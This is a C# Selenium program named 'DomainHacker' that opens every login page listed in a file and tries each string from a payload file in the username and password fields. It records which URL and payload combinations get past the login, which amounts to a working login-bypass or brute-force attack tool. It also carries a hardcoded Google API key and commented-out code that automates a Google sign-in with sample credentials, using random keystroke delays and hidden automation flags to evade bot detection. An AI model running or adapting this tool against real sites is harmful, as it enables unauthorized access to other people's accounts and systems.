using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Firefox;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace DomainHacker
{
    internal class Program
    {
        static Random random = new Random();
        static void Main(string[] args)
        {
            Console.WriteLine("Press c for chrome and f for firefox");
            string browser = Console.ReadLine();

            string[] payloads = File.ReadAllLines(@"payloads.txt");
            FileStream allowedFileStream = new FileStream(@"allowed.txt", FileMode.Append, FileAccess.Write);
            StreamWriter allowedWriter = new StreamWriter(allowedFileStream);

            IWebDriver driver = null;
            if(browser.ToLower() == "c")
            {
                driver = Createdriver();
            }
            else if(browser.ToLower() == "f")
            {
                driver=CreateFirefoxDriver();
            }

            //string googleCustomSearchApiKey = "AIzaSyCIB9XRDpeOYR0Mcl52dwRMmbE4lJetns8";
            




            //Console.WriteLine("Update urls.text file and close then press here enter");
            //Console.ReadLine(); 

            string[] urls = File.ReadAllLines(@"urls.txt");
            if (driver != null)
            {
                foreach (string url in urls)
                {
                    IJavaScriptExecutor scriptExecutor = (IJavaScriptExecutor)driver;
                    scriptExecutor.ExecuteScript("window.open()");
                }

                foreach (string payload in payloads)
                {
                    int counter = 0;
                    foreach (string url in urls)
                    {                       
                        try
                        {
                            driver.SwitchTo().Window(driver.WindowHandles[counter]);
                            driver.Navigate().GoToUrl(url);
                            //USER ID/EMAIL/USERNAME
                            try
                            {
                                var element = driver.FindElements(By.CssSelector("input"));
                                int i = 0;
                                foreach(var item in element)
                                {
                                    string type = item.GetAttribute("type");
                                    if (type == "text" || type == "username" || type == "email")
                                    {
                                        if(element[i+1].GetAttribute("type") == "password")
                                        {
                                            item.SendKeys(payload);
                                            goto PASSWORD;
                                        }
                                    }
                                    i++;
                                }
                            }
                            catch (Exception)
                            {
                                
                            }
                        
                        //PASSWORD
                        PASSWORD:
                            driver.FindElement(By.CssSelector("input[type = password]")).Clear();
                            driver.FindElement(By.CssSelector("input[type = password]")).SendKeys(payload);


                            Thread.Sleep(700);


                            //SUBMIT/BUTTON
                            try
                            {
                                var elements = driver.FindElements(By.CssSelector("input"));
                                int i = 0;
                                foreach (var item in elements)
                                {
                                    try
                                    {
                                        string type = item.GetAttribute("type");
                                        if (type == "submit" || type == "button")
                                        {
                                            if (elements[i - 1].GetAttribute("type") == "password")
                                            {
                                                item.Click();
                                                goto OUT;
                                            }
                                            if (elements[i - 1].GetAttribute("type") == "checkbox" && elements[i - 2].GetAttribute("type") == "password")
                                            {
                                                item.Click();
                                                goto OUT;
                                            }
                                        }
                                    }
                                    catch (Exception)
                                    {
                                        continue;
                                    }
                                    i++;
                                }   
                            }
                            catch (Exception)
                            {
                                goto SUBMIT2;
                            }
                        
                        SUBMIT2:
                            try
                            {
                                var elements = driver.FindElements(By.CssSelector("button"));
                                elements[elements.Count - 1].Click();   
                                goto OUT;
                            }
                            catch (Exception) { }

                        OUT:
                            try
                            {
                                driver.SwitchTo().Alert().Dismiss();
                            }
                            catch (Exception)
                            {

                            }
                            try
                            {
                                string currentUrl = driver.Url;
                                if (!currentUrl.Contains("login.php") && !currentUrl.Contains("error"))
                                {
                                    allowedWriter.WriteLine(url + "    " + payload);
                                    allowedWriter.Flush();
                                    allowedFileStream.Flush();
                                }
                            }
                            catch (Exception) { }
                        }
                        catch (Exception){ continue;  }

                        counter++;
                    }
                }
                allowedWriter.Close();
                allowedFileStream.Close();
                driver.Dispose();
                //KillProcesses();
            }
        }


        //driver.Navigate().GoToUrl("https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin");
        //string id = "johnsmithid012";
        //string pw = "idsmithjohn@012";
        //int x = 0;
        //Random random = new Random();
        //while(x < id.Length)
        //{
        //    Thread.Sleep(random.Next(5, 20) * 100);
        //    driver.FindElement(By.CssSelector("#identifierId")).SendKeys(id[x].ToString());
        //    x++;
        //}
        //driver.FindElement(By.CssSelector("#identifierId")).SendKeys(Keys.Enter);
        //driver.Navigate().GoToUrl("https://accounts.google.com/signin/v2/challenge/pwd?flowName=GlifWebSignIn&flowEntry=ServiceLogin&cid=1&navigationDirection=forward&TL=AM3QAYZpUYwLtvN3kAIfn7B7k20NrWvJ3d5cvUXbZX30O1F-0brsww1dE5ZxOE3h");
        //Thread.Sleep(3000);
        //int y = 0;
        //while(y < pw.Length)
        //{
        //    Thread.Sleep(random.Next(5, 20) * 100);
        //    driver.FindElement(By.CssSelector("#password")).SendKeys(pw[y].ToString());
        //    y++;
        //}
        //driver.FindElement(By.CssSelector("#password > div:nth-child(1) > div:nth-child(1) > div:nth-child(1) > input:nth-child(1)")).SendKeys(Keys.Enter);





        static public void KillProcesses()
        {
            Process[] driverProcesses = Process.GetProcessesByName("chrome");
            Process[] firefoxDriverProcesses = Process.GetProcessesByName("firefox");
            foreach (var driverProcess in driverProcesses)
            {
                driverProcess.Kill();
            }
            foreach (var firefoxDriverProcess in firefoxDriverProcesses)
            {
                firefoxDriverProcess.Kill();
            }
        }
        static private ChromeDriver Createdriver()
        {
            ChromeOptions options = new ChromeOptions();
            //options.AddArgument("--headless");
            options.AddArgument("--no-sandbox"); 
            options.AddExcludedArgument("enable-automation");
            options.AddAdditionalCapability("useAutomationExtension", false);
            ChromeDriverService service = ChromeDriverService.CreateDefaultService();
            //service.HideCommandPromptWindow = true;
            //TimeSpan.FromSeconds is the max time for request to timeout
            ChromeDriver driver = new ChromeDriver(service, options, TimeSpan.FromSeconds(random.Next(40, 60)));
            driver.Manage().Timeouts().PageLoad.Add(System.TimeSpan.FromSeconds(random.Next(10, 20)));
            driver.Manage().Window.Maximize();
            return driver;
        }
        static private FirefoxDriver CreateFirefoxDriver()
        {
            FirefoxOptions options = new FirefoxOptions();
            //options.AddArgument("--headless");
            options.AddArgument("--no-sandbox");
            FirefoxDriverService service = FirefoxDriverService.CreateDefaultService();
            //service.HideCommandPromptWindow = true;
            FirefoxDriver driver = new FirefoxDriver(service, options, TimeSpan.FromSeconds(random.Next(40, 60)));
            driver.Manage().Timeouts().PageLoad.Add(System.TimeSpan.FromSeconds(random.Next(10, 20)));
            driver.Manage().Window.Maximize();
            return driver;
        }

    }
}
